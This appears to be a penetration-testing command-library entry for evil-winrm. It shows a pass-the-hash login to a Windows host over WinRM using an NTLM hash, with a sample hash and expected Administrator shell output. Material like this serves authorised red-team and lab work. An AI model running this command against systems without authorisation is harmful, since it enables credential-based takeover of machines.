---
id: 66a97e96-09c1-4dbb-9144-83910cd3424e
name: evil-winrm-connect-with-ntlm
type: command
executor: bash
data: evil-winrm -i $_TARGET_IP -u $_USERNAME -H $_NTLM_HASH
output: |-
  Evil-WinRM shell v2.3
  *Evil-WinRM* PS C:\Users\Administrator\> 
created_at: '2020-03-16T02:05:05.221748+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - winrm
  - pth
verified: true
validated: true
---

# evil-winrm-connect-with-ntlm

## Command

```bash
evil-winrm -i $_TARGET_IP -u $_USERNAME -H $_NTLM_HASH
```

## Description

Connects using NTLM hash.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -i $_TARGET_IP | IP | Yes |
| -u $_USERNAME | User | Yes |
| -H $_NTLM_HASH | Hash | Yes |

## Examples

### Basic Usage

```bash
evil-winrm -i 192.168.1.10 -u admin -H aad3b435b51404eeaad3b435b51404ee:ntlmhash
```

## Expected Output

Admin shell.
